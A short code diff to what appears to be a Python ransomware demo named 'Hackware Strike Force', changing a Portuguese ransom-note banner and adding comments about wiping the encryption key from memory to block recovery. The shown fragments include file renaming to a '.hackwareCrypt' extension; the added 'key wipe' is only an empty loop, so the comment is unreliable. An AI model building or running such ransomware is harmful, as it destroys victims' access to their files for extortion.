@@ -29,7 +29,7 @@ def main():
     if decrypt:
         print('''
             Hackware Strike Force
-            ---------------
+            ------------------------------------------------------
             Seus Arquivos foram Criptografados. 
             Normalmente esta é a parte em que eu pediria algum resgate pelos seus arquivos
             e caso você concordasse em pagar, eu te enviaria uma chave de desencriptação.
@@ -55,6 +55,8 @@ def main():
             # Renomeia o arquivo pra indicar a encriptação
             os.rename(filename, filename+'.hackwareCrypt')
 
+    # Limpa a chave de encriptação da Memória
+    # para evitar a recuperação através de ferramentas
     for _ in range(100):
         pass
 
